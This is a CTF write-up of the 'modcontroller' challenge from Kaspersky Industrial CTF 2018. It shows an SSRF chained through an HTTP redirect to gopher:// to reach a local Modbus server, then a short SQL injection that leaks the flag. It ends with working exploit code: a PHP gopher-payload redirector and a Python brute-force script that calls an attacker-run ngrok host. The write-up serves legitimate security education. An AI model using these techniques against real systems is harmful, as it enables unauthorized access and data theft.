---
layout: post
title: Kaspersky Industrial CTF 2018 - modcontroller
description: Writeup for challenge "modcontroller" of Kaspersky Industrial CTF 2018.
comments: true
---

This weekend I played Kaspersky Industrial CTF 2018 with [spritzers](http://spritz.math.unipd.it/spritzers.html), where we got 7th place.
Not bad considering most of us couldn't play (and I slept _way_ too much :P).
I liked "modcontroller", a pwn challenge worth 994 points in the end.
It actually was more of a web challenge than a pwn one, and I enjoyed doing something different than usual.

> Can you guess the admin password?
> 
> http://modcontroller.2018.ctf.kaspersky.com/

You can grab the challenge binary [here](/assets/ctf/kaspersky18/modcontroller).

### Overview

I won't go into reversing the whole thing, it's not too complex but would take up a lot of space.
The binary contained two servers: a HTTP server (using libmicrohttpd) and a TCP/IP Modbus server on port 1502.
The HTTP server was exposed, while the Modbus server was bound only on localhost.

### The HTTP server

This server had two routes:
- `/static`: unathenticated, accepts a `url` GET parameter and makes an HTTP GET request to that URL using libcurl, then sends back the response body.
- Every other URL: protected by HTTP basic auth (hardcoded username `admin`), shows a hardcoded image (not interesting).

To store passwords, the server uses a SQLite database (`passwd.db`), which contains a `K` table with a (unique) `P` column.
To check a password, it performs the following query: `SELECT P FROM K WHERE P = ?`, where `?` is bound to the password.

### The Modbus server

This server has the sole purpose of allowing to add passwords for the HTTP authentication.
It works on the same `passwd.db` database and, when it receives a certain message, it performs `INSERT OR IGNORE INTO K(P) SELECT '%s'`, where `%s` is the password contained in the message: this is vulnerable to SQL injection.
If we're able to communicate with the Modbus server, we can insert passwords and gain access to the HTTP server -- maybe the hardcoded image is different on the real challenge server.
Moreover, we can perform SQL injections.

### The SSRF

It looks like communicating with the Modbus server is the way to go.
Unfortunately, the server is only reachable locally.
However, the `/static` endpoint allows to perform an HTTP GET request on an arbitrary URL, so we have a Server Side Request Forgery.

The server ensures that the URL begins with `http://` or `https://`, so the protocol is restricted to HTTP(S).
The raw bytes of HTTPS requests are not really controllable, so let's stick with HTTP.
My first attempt was with requests like `/static?url=http://127.0.0.1:1502/<x>`, which will send `GET /<x> ...` to the Modbus server.
I needed to figure out how to smuggle a Modbus message inside of this.

I will explain the Modbus message in the next section, however, a couple facts seem to help us out here:
- The first 7 bytes are ignored: therefore, the `GET /` prefix will be ignored.
- Trailing bytes are ignored: all the other HTTP stuff that follows our `<x>` will be ignored.

Given this, it seems possible to build a Modbus message and smuggle it into the requested URL.
However, it doesn't work, because the Modbus message needs to contain a few NUL bytes.
While we can encode them as `%00` in the `url` parameter to `/static`, the URL will then be treated as a C string by the HTTP server and libcurl.
Therefore, the message will be truncated at the first NUL.
Back to the drawing board...

After a while, I noticed that the HTTP server was setting the `CURLOPT_FOLLOWLOCATION` option for the GET request.
This instructs libcurl to follow HTTP redirects (3xx codes).
I set up a local HTTP server (`php -S`) with a PHP script that redirected to a different protocol, then requested it via `curl -L`.
Sure enough, it happily followed the redirect.
This means we're no longer restricted to HTTP(S) for the SSRF, which is very good news!
Unfortunately, curl won't follow `file://` redirects, so we can't dump `passwd.db` (where I assume the flag is stored).

A nice trick when we can control the protocol is to use `gopher://`.
A request to `gopher://host:port/x<data>` will open a connection to `host:port` and send raw (urldecoded) `<data>` on the socket (`x` is an arbitrary character, it's ignored).
Therefore, we can set up an HTTP server that redirects to `gopher://127.0.0.1:1502/x<data>`, then request our server through the SSRF, and libcurl will send `<data>` to the Modbus server.
Now we can communicate with the Modbus server.
Time to craft a message.

### The Modbus message

After spending some time reading libmodbus and reversing the Modbus server, I figured out the format of messages the the server wanted:

```
+0x0: 7-byte header (ignored)
+0x7: 0x10 (MODBUS_FC_WRITE_MULTIPLE_REGISTERS)
+0x8: 0x00 0x01 (?)
+0xa: 0x00 0x10 (# of regs, big endian)
+0xc: 0x20 (password length)
+0xd: 32-byte password
```

The 32-byte password is then NUL-terminated and `sprintf`ed into `INSERT OR IGNORE INTO K(P) SELECT '%s'`.
Note that by padding the password with NULs we can have passwords that are less than 32 bytes.
It just has to be 32 bytes of data in the message.

First thing I tried was adding a password and logging into the HTTP server.
The image was exactly the same as the hardcoded one.
All right, I guess we need to exploit the SQL injection while limited to 32 characters.

We suspect that the flag is the original admin password.
We know that flags begin with `KLCTF{`.
By injecting a WHERE clause with a `glob`, I determined that there was a password beginning with `KLC` (blame the character limit), so I was pretty confident the suspicion was right.
It took me a while to come up with an injection to reveal the flag with such a restrictive character limit.
In the end, here's what I used (`n` is a placeholder for a 1-2 digit number, `XXXXXX` is a random string):
```
XXXXXX'||substr(P,1,n)from K--
```

This will result in the following query (reformatted for clarity):

```
INSERT OR IGNORE INTO K(P) SELECT 'XXXXXX' || substr(P,1,n) FROM K --'
```

This will add all the password obtained by taking the first `n` characters from every password in `K` and prefixing them with `XXXXXX`.
The prefix doesn't really matter, but we had space in the query and it avoids collisions (and giving an advantage to other teams).

For example, let `n = 7`.
Then, among the passwords that we add to the database, there will be `XXXXXXKLCTF{y`, where `y` is the seventh character of the flag.
We use the HTTP login to bruteforce this character.
Once we have it, we up `n` to 8, bruteforce the eight character, and so forth.
Since this is in linear time and the bruteforce happens over the HTTP login (which is pretty fast), it won't take long to recover the entire flag.

At last, we capture the flag: `KLCTF{M0dbu5_v14_55RF_n07_345y_}`.

### Exploit code

This is the PHP script for redirection and injection (`index.php`):

```php
<?php

$prefix = "97r6B4";
$injection = $prefix . "'||substr(P,1," . $_GET["n"] . ")from K--";

$payload  = str_repeat("A", 7);
$payload .= "%10%00%01%00%10%20";
$payload .= $injection;
$payload .= str_repeat("%00", 0x20 - strlen($injection));

header("HTTP/1.1 303 See Other");
header("Location: gopher://127.0.0.1:1502/x" . $payload);

?>
```

This is the Python script for bruteforcing:

```python
#!/usr/bin/env python2

import requests
import string

BASE = 'http://modcontroller.2018.ctf.kaspersky.com'
STATIC_ENDP = BASE + '/static'
ATTACK_ENDP = 'http://5f88e703.ngrok.io/?n='
PREFIX = '97r6B4'
ALPHABET = string.printable

def static(url):
    r = requests.get(STATIC_ENDP, params={
        'url': url
    })
    return r.status_code == 200

def test_pass(pwd):
    r = requests.get(BASE, auth=('admin', pwd))
    return r.status_code == 200

flag = 'KLCTF{'
while True:
    url = ATTACK_ENDP + str(len(flag) + 1)
    assert(static(url))

    found = None
    for c in ALPHABET:
        if test_pass(PREFIX + flag + c):
            found = c
            break
    if found is None:
        break

    flag += found
    print flag
```
